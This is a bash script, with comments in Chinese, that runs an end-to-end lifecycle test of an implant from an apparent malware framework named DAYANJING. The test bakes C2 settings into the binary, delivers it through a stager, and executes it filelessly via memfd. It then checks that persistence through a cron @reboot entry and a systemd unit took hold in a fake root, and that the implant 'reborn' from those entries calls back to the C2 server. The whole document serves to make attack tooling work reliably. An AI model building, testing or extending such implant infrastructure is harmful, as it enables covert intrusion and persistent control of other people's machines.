#!/bin/bash
# DAYANJING v4 — 25_deploy/scripts/lifecycle.sh
#
# 完整生命周期端到端验证：
#   烧录配置 → 打包 → 投递 → memfd 执行 → 驻留(假根) → 死亡
#   → 重生(按驻留条目重新拉起) → 回连 C2 → 回传产物
#
# 为什么单独做这一项：此前每个环节都各自验证过（投递真执行、持久化
# 安装、C2 握手回传），但从未串成一条链。零件齐不等于枪能响 ——
# 尤其"重生后仍能回连"这条，是持久化唯一的意义所在，此前无人验证。
#
# 关键真实性要求：
#   1. 制品经 memfd 执行，stager 用空 argv/空 envp 启动它。
#      因此 C2 地址、PSK、 implant_id、持久化根 **必须构建期烧录**，
#      否则植入体只会连默认的 127.0.0.1:8443（那不是 C2），
#      且 persist_root 为空会写宿主真实 /etc/cron.d —— 污染测试机。
#   2. 持久化一律写假根，绝不碰真实 /etc、/var/tmp。
#   3. 重生不是"再跑一次二进制"，而是**解析驻留条目**拿到路径再执行，
#      与真实 cron/systemd 重启的语义一致。

set -u

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
WORK=/tmp/lc_work_$$
ROOT=/tmp/lc_root_$$
PASS=0; FAIL=0

chk() { # chk <描述> <条件命令...>
    local d="$1"; shift
    if "$@" >/dev/null 2>&1; then
        echo "[PASS] $d"; PASS=$((PASS+1))
    else
        echo "[FAIL] $d"; FAIL=$((FAIL+1))
    fi
}

mkdir -p "$WORK" "$ROOT"
cleanup() { rm -rf "$WORK" "$ROOT"; }
trap cleanup EXIT

# ---- 端口分配：先 bind 取端口再关，避免固定端口冲突 ----
PORT=$(python3 -c 'import socket;s=socket.socket();s.bind(("127.0.0.1",0));print(s.getsockname()[1]);s.close()')
SPORT=$(python3 -c 'import socket;s=socket.socket();s.bind(("127.0.0.1",0));print(s.getsockname()[1]);s.close()')
echo "[INFO] C2 port=$PORT  drop port=$SPORT  root=$ROOT"

IMPLANT="$REPO/monolith/implant"
[ -x "$IMPLANT" ] || { echo "[FATAL] 缺少 $IMPLANT"; exit 2; }

# ---- 1. 烧录配置到副本 ----
cp "$IMPLANT" "$WORK/implant.cfg" || { echo "[FATAL] 复制失败"; exit 2; }
"$REPO/monolith/obj/embedcfg" "$WORK/cfg.bin" \
    --host 127.0.0.1 --port "$PORT" --id lc-implant-01 \
    --persist-root "$ROOT" --run-ms 2500 --period 200 --allow-sandbox \
    --check "$WORK/implant.cfg" || { echo "[FATAL] 烧录段核对失败"; exit 2; }
objcopy --update-section .mono_cfg="$WORK/cfg.bin" "$WORK/implant.cfg" \
    || { echo "[FATAL] objcopy 烧录失败"; exit 2; }
echo "[INFO] 配置已烧录（host/port/id/persist_root/run_ms）"

# ---- 2. 打包 ----
"$REPO/25_deploy/build/deploy_pack" "$WORK/implant.cfg" "$WORK/implant.dj" \
    || { echo "[FATAL] 打包失败"; exit 2; }

# ---- 3. seed（与 deploy_pack 内 DEPLOY_SEED 一致）----
python3 - <<'EOF' > "$WORK/seed.bin"
import sys
seed = bytes([0x44,0x41,0x59,0x41,0x4e,0x4a,0x49,0x4e,
              0x47,0x2d,0x44,0x45,0x50,0x4c,0x4f,0x59,
              0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,
              0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f])
sys.stdout.buffer.write(seed)
EOF

# ---- 4. 起 C2 服务端（用同一份烧录副本，保证 PSK/ID 一致）----
"$WORK/implant.cfg" --server --port "$PORT" --run-ms 20000 --allow-sandbox \
    > "$WORK/srv.log" 2>&1 &
SRV=$!
sleep 1

# ---- 5. 起投递点（写出 manifest）----
"$REPO/25_deploy/build/drop_serve" 127.0.0.1 "$SPORT" \
    "$WORK/implant.dj" "$WORK/manifest.bin" > "$WORK/serve.log" 2>&1 &
SERVE=$!
sleep 1

# ---- 6. 第一轮：stager 投递 + memfd 执行 ----
echo "--- 第一轮：投送并落地 ---"
timeout -s KILL 60 "$REPO/25_deploy/build/drop_stager" \
    127.0.0.1 "$SPORT" "$WORK/manifest.bin" "$WORK/seed.bin" \
    > "$WORK/stager1.log" 2>&1
RC1=$?
echo "[INFO] stager 退出码=$RC1"
chk "第一轮：stager 投递并成功执行（退出码 0）" test "$RC1" -eq 0

# ---- 7. 驻留断言 ----
# agent 落点目录由 09_persistence 的驻留常量决定，伪装改名后会随之变化。
# 此处硬编码过一次 .dayanjing，改名后实测留下 2 条 FAIL 而 cron/unit 断言
# 仍绿（两者用的是服务名，与落点名不同源）——症状极易被误读成"驻留没生效"。
# 改为从源码派生，杜绝判据再次过期。
PERSIST_DIR=$(grep -oE '/var/tmp/\.[A-Za-z0-9_-]+' \
    "$REPO/09_persistence/src/persist.c" 2>/dev/null | sort -u | head -1)
[ -n "$PERSIST_DIR" ] || { echo "[FATAL] 无法从 persist.c 提取落点常量"; exit 1; }
AGENT="$ROOT$PERSIST_DIR/agent"
chk "驻留：假根内落盘了 agent 二进制" test -s "$AGENT"
chk "驻留：落盘二进制非空且为 ELF" bash -c \
    "[ -s '$AGENT' ] && head -c4 '$AGENT' | grep -q ELF"
chk "驻留：cron 条目已写入假根" test -s "$ROOT/etc/cron.d/dayanjing"
chk "驻留：systemd unit 已写入假根" test -s \
    "$ROOT/etc/systemd/system/dayanjing.service"

# 落盘二进制必须与源一致：memfd 执行时 /proc/self/exe 指向 memfd，
# 能否读出完整 ELF 是这条路径的成败关键（读不出则驻留的是坏文件）。
if [ -s "$AGENT" ] && [ -f "$WORK/implant.cfg" ]; then
    A=$(md5sum "$AGENT" | cut -d' ' -f1)
    B=$(md5sum "$WORK/implant.cfg" | cut -d' ' -f1)
    chk "驻留：落盘二进制与投送制品逐字节一致（memfd 下 drop_self 有效）" \
        test "$A" = "$B"
    echo "[INFO] agent md5=$A  source md5=$B"
fi

# ---- 8. 第一轮服务端侧证据 ----
chk "第一轮：C2 收到握手（implant_id 为烧录值）" bash -c \
    "grep -q 'lc-implant-01' '$WORK/srv.log'"
N1=$(grep -c "收到产物\|handshake\|握手" "$WORK/srv.log" 2>/dev/null || echo 0)
echo "[INFO] 第一轮服务端日志匹配行数=$N1"

# ---- 9. 死亡：确认第一轮进程已退出 ----
wait $SRV 2>/dev/null
kill -9 $SERVE 2>/dev/null
wait $SERVE 2>/dev/null

# ---- 10. 重生：解析驻留条目取路径，执行（模拟重启）----
echo "--- 第二轮：按驻留条目重生 ---"
REBORN=""
if [ -s "$ROOT/etc/cron.d/dayanjing" ]; then
    # cron 条目形如 "@reboot /path/to/agent"
    REBORN=$(sed -n 's/^@reboot[[:space:]]*\([^[:space:]]*\).*/\1/p' \
        "$ROOT/etc/cron.d/dayanjing" | head -1)
fi
if [ -z "$REBORN" ] && [ -s "$ROOT/etc/systemd/system/dayanjing.service" ]; then
    REBORN=$(sed -n 's/^ExecStart=//p' \
        "$ROOT/etc/systemd/system/dayanjing.service" | head -1)
fi
echo "[INFO] 解析到的重启命令路径=$REBORN"
chk "重生：从驻留条目解析出了可执行路径" test -n "$REBORN"
chk "重生：该路径确实存在且可执行" test -x "$REBORN"

# 服务端再起一次（上一轮已退出），收第二轮的回连
"$WORK/implant.cfg" --server --port "$PORT" --run-ms 12000 --allow-sandbox \
    > "$WORK/srv2.log" 2>&1 &
SRV2=$!
sleep 1

RC2=1
if [ -n "$REBORN" ] && [ -x "$REBORN" ]; then
    # 无参数启动：全部依赖烧录配置，与真实 @reboot 语义一致
    timeout -s KILL 40 "$REBORN" > "$WORK/reborn.log" 2>&1
    RC2=$?
fi
echo "[INFO] 重生进程退出码=$RC2"
chk "重生：进程正常退出（退出码 0）" test "$RC2" -eq 0
chk "第二轮：C2 收到重生植入体的握手（同一 implant_id）" bash -c \
    "grep -q 'lc-implant-01' '$WORK/srv2.log'"

wait $SRV2 2>/dev/null

echo
echo "=== lifecycle result: $PASS pass, $FAIL fail ==="
[ "$FAIL" -eq 0 ]
